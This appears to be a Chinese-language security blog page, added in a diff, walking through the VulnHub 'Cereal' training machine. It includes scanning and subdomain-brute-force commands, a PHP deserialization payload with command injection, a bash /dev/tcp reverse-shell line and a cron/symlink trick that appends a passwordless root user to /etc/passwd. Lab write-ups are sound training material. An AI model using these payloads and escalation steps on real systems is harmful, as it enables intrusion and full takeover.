@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="21 Vulnhub Cereal Writeup">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102517.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105659.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505115315.png">
+<meta property="article:published_time" content="2022-05-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-06-07T03:50:30.362Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="综合">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="路径爆破">
+<meta property="article:tag" content="域名解析">
+<meta property="article:tag" content="子域名爆破">
+<meta property="article:tag" content="匿名ftp">
+<meta property="article:tag" content="进程监视">
+<meta property="article:tag" content="linux软链接">
+<meta property="article:tag" content="crontab利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>21 Vulnhub Cereal Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/06/FBCTF2019%20RCEService/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 44441端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        21 Vulnhub Cereal Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/crontab%E5%88%A9%E7%94%A8/" rel="tag">crontab利用</a>, <a class="tag-link-link" href="/tags/linux%E8%BD%AF%E9%93%BE%E6%8E%A5/" rel="tag">linux软链接</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%8C%BF%E5%90%8Dftp/" rel="tag">匿名ftp</a>, <a class="tag-link-link" href="/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" rel="tag">域名解析</a>, <a class="tag-link-link" href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/" rel="tag">子域名爆破</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>, <a class="tag-link-link" href="/tags/%E8%B7%AF%E5%BE%84%E7%88%86%E7%A0%B4/" rel="tag">路径爆破</a>, <a class="tag-link-link" href="/tags/%E8%BF%9B%E7%A8%8B%E7%9B%91%E8%A7%86/" rel="tag">进程监视</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1. 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cereal-1,703/">Cereal: 1 ~ VulnHub</a></li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>高（接近真实场景）</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>取得root权限</li>
+<li>拿到2个flag</li>
+</ul>
+<p>攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>信息收集</li>
+<li>路径枚举</li>
+<li>密码爆破</li>
+<li>域名解析</li>
+<li>匿名FTP</li>
+<li><strong>子域名爆破</strong></li>
+<li>源码审计</li>
+<li>反序列化漏洞</li>
+<li><strong>进程监视</strong></li>
+<li>软链接</li>
+</ul>
+<h1 id="渗透">2. 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.25</span><br><span class="line">sudo nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,44441,44444,55551,55555 -A 10.0.2.25</span><br></pre></td></tr></table></figure>
+<p>该靶机开放的端口很多。信息如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">11111/tcp open  vce</span><br><span class="line">22222/tcp open  easyengine</span><br><span class="line">22223/tcp open  unknown</span><br><span class="line">33333/tcp open  dgi-serv</span><br><span class="line">33334/tcp open  speedtrace</span><br><span class="line">44441/tcp open  unknown</span><br><span class="line">44444/tcp open  cognex-dataman</span><br><span class="line">55551/tcp open  unknown</span><br><span class="line">55555/tcp open  unknown</span><br></pre></td></tr></table></figure></p>
+<p>可以一一对各个端口的服务进行查看。</p>
+<p>首先查看21端口，利用-A参数知道可以匿名登录，因此使用下面命令连接 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ftp 10.0.2.25</span><br><span class="line">2. Anonymous</span><br><span class="line">3. 密码为空，直接回车</span><br></pre></td></tr></table></figure></p>
+<p>只有一个pub目录，并且该目录为空，尝试上传文件也失败了 <figure class="highlight plaintext"><figcaption><span>put hello.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local: hello.txt remote: hello.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||56531|)</span><br><span class="line">550 Permission denied.</span><br></pre></td></tr></table></figure></p>
+<p>因此尝试其他端口。</p>
+<p>其中139和445端口上的服务可能是mssql，经查看没有可利用的地方；3306禁止kali的ip连接，可能没有开启外连；44441和80端口的服务都是http，其他端口虽然开放，也可以用nc连接的上，但是无论输入任何命令，服务器都不会有响应，因此，这些端口可能只是一个幌子，还有可能是蜜罐。</p>
+<h2 id="访问http服务">2.2. 访问http服务</h2>
+<h3 id="端口">2.2.1. 80端口</h3>
+<p>直接访问，发现这就是apache的一个默认界面，但是，知道了靶机的操作系统为Rocky Linux。接着查看源码、抓包都没有什么有用的信息，因此直接进行目录扫描。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png" /></p>
+<p>注意到两个可以的目录: admin, blog。</p>
+<p>首先是admin，这是一个登录界面，可以尝试对其进行爆破，但是最终一无所获。对其再次进行路径扫描，并没有发现有用的信息。</p>
+<p>后者是得到一个界面，该界面中主要有3个信息：</p>
+<ol type="1">
+<li>一个域名：cereal.ctf</li>
+<li>搜索框</li>
+<li>back up，也就是说cereal.ctf下面可能存在备份信息</li>
+</ol>
+<p>尝试对搜索框进行测试，并没有漏洞。对blog进行路径扫描，会发现许多文件，但一一查看之后，并没有可以利用的。在测试过程中，发现许多的功能都转到了cereal.ctf下，因此尝试将其加入到/etc/hosts之后再次进行尝试，还是一无所获。</p>
+<h3 id="端口-1">2.2.2. 44441端口</h3>
+<p>页面非常简单，就一句话 "Coming soon..."，因此对该目录进行路径扫描 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
+<p>没有找到任何有用的信息，如果使用域名呢？ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://cereal.ctf:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
+<p>与上面的一样，没有任何有用的信息。联想到，既然靶机给了我们一个域名，那是不是存在子域名？因此尝试扫描一下是否有子域名： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441/ -t 20 -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到一个 secure.cereal.ctf 子域名，将其添加到hosts中，然后访问</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102057.png" /></p>
+<p>终于得到一个功能点，这看起来像是执行了系统命令ping，因此后台可能存在着命令执行的漏洞，但是输入<code>127.0.0.1;ls</code>时，结果是空白，应该是做了一定的过滤。</p>
+<p>对其进行路径扫描，得到一个/php，直接访问它，发现了一个值得怀疑的点，那就是该文件第一行就是定义了一个序列化的函数。我们抓包查看一下我们点击ping时的数据</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102517.png" /></p>
+<p>经过url decode，原来真的是经过了序列化之后的数据。反序列化的漏洞很难在黑盒的情况下进行利用，所以我们需要找到源码，联想到刚刚有一个备份文件没有找到,这里换一个工具进行扫描，gobuster我没扫出来： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ </span><br></pre></td></tr></table></figure></p>
+<p>扫描出一个 back_en 目录，该目录不让直接访问，扫描一下该目录下是是否存在备份文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://secure.cereal.ctf:44441/back_en</span><br></pre></td></tr></table></figure></p>
+<p>（感觉扫常规的目录和文件，dirsearch更快）扫出一个index.php.bak，直接访问查看源码，得到如下php代码： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">False</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">if</span> (filter_var(<span class="keyword">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;isValid = <span class="literal">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ping();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output = shell_exec(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = unserialize(urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pingTest</span>-&gt;validate();</span><br></pre></td></tr></table></figure></p>
+<h2 id="get-shell">2.3. get shell</h2>
+<p>通过代码审计可以得知，如果输入127.0.0.1;ls，那么无法通过validate()的过滤，但是只要 isValid 为True就可以直接绕过过滤函数，因此构造方法也很简单： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1;id&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> pingTest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105448.png" /></p>
+<p>命令被成功执行。然后我使用了which nc，发现没有回显，还以为没有nc，但是 nc 10.0.2.4 3333 时却可以连接到我的主机，所以其实是有nc的，直接通过nc反弹shell。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105659.png" /></p>
+<p>还可以通过下面的命令： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>重点在后半句，解释如下：</p>
+<table>
+<thead>
+<tr class="header">
+<th>命令</th>
+<th>详解</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>bash -i</td>
+<td>产生一个bash环境</td>
+</tr>
+<tr class="even">
+<td><code>&gt;&amp;</code></td>
+<td>将&amp;前面的内容与后面的内容相结合，然后一起重定向给后者</td>
+</tr>
+<tr class="odd">
+<td>/dev/tcp/ip/port</td>
+<td>让目标主机与攻击机ip的port建立一个tcp连接</td>
+</tr>
+<tr class="even">
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出内容相结合，然后重定向给标准输出</td>
+</tr>
+</tbody>
+</table>
+<h2 id="权限提升">2.4. 权限提升</h2>
+<p>首先进行常规的一些信息收集，内核、sudo，suid，都没有可以使用的点。查看端口和进程也没有可以利用的。与bash有关的用户只有两个: rocky, root。</p>
+<p>这里的提权使用到之前没有用过的方法，<strong>就是通过监视进程的产生，从而确定产生该进程的命令，然后利用这些命令中涉及到的脚本/程序来提权</strong>。首先需要一个工具 pspy64 或者 linpeas.sh（这个好像是一个信息收集的工具）</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases">Releases · carlospolop/PEASS-ng · GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions</a></li>
+</ul>
+<p>先在kali下载，然后通过nc传到靶机，并给予执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pspy</span><br></pre></td></tr></table></figure>
+<p>注意到有这么一行： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
+<p>该脚本由root运行，并且看这名字像是更改属主的脚本，通过 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/share/scripts/chown.sh</span><br><span class="line">-rw-r--r--. 1 root root 45 May 29  2021 /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
+<p>发现我们拥有读的权限。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure></p>
+<p>该脚本的作用就是将/home/rocky/public_html/目录下面的所有文件的属主改为rocky，所有组改为apache。</p>
+<p>并且该脚本并不是指运行一次：（我一直开着pspy监视进程） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/05/05 04:20:01 CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line">2022/05/05 04:30:01 CMD: UID=0    PID=24389  | /bin/bash /usr/share/scripts/chown.sh </span><br><span class="line">2022/05/05 04:40:01 CMD: UID=0    PID=42855  | /bin/bash /usr/share/scripts/chown.sh </span><br></pre></td></tr></table></figure></p>
+<p>从执行时间可以看到，好像是每隔10分钟就会自动执行一次，这让我想到了cron，那如何利用这个呢？</p>
+<blockquote>
+<p>这里有一个重要的关于Linux的知识点：<strong>修改软链接的所有者/组的话，也会修改所链接的文件的所有者/组。</strong></p>
+</blockquote>
+<p>利用方法如下：</p>
+<ol type="1">
+<li>可以设置一个软链接指向/etc/passwd</li>
+<li>然后把该链接放在/home/rocky/public_html/目录下</li>
+<li>每过10分钟，chown.sh就会修改/home/rocky/public_html/目录下所有文件的所有者/组，也就把软链接的所有者/组给修改了</li>
+<li>那么我们就可以随意的修改/etc/passwd的内容，比如添加一个uid和gid为0的用户，也就是root</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> /home/rocky/public_html/</span><br><span class="line">2. ln -sf /etc/passwd ./passwd</span><br><span class="line"></span><br><span class="line">等到 2022/05/05 04:50:01 CMD: UID=0    PID=42906  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">3. ls -l /etc/passwd <span class="comment"># 查看权限</span></span><br><span class="line">4. <span class="built_in">echo</span> <span class="string">&quot;m1ku::0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd  <span class="comment"># 添加一个root用户，注意密码为空</span></span><br><span class="line">5. su m1ku</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505115315.png" /></p>
+<p>读取flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. /hoem/rocky/local.txt</span><br><span class="line">aaa87365bf3dc0c1a82aa14b4ce26bbc</span><br><span class="line"></span><br><span class="line">2. /root/flag.txt</span><br><span class="line">Well done! You have completed Cereal.</span><br><span class="line"></span><br><span class="line">  ____                    _ </span><br><span class="line"> / ___|___ _ __ ___  __ _| |</span><br><span class="line">| |   / _ \ &#x27;__/ _ \/ _` | |</span><br><span class="line">| |__|  __/ | |  __/ (_| | |</span><br><span class="line"> \____\___|_|  \___|\__,_|_|</span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line">This box was brought to you by Bootlesshacker.</span><br><span class="line"></span><br><span class="line">Follow me on Twitter: @bootlesshacker</span><br><span class="line">My website: https://www.bootlesshacker.com</span><br><span class="line"></span><br><span class="line">Root Flag: 1aeb5db4e979543cb807cfd90df77763</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">3. 总结</h1>
+<p>该靶机的难度在于两点：</p>
+<ol type="1">
+<li>在web渗透的时候，两个端口，并且需要设置hosts，还涉及到子域名，最费时间的是路径扫描要使用比较大的字典，否则扫不出来；</li>
+<li>权限提升的时候常规可利用的点都无法使用，虽然本质上还是通过cron来提权，但是需要找到存在这么一个脚本也是不简单的；</li>
+<li>还有Linux 软链接的知识点也很重要，否则即使知道存在chown.sh脚本，也不知道怎么利用；</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
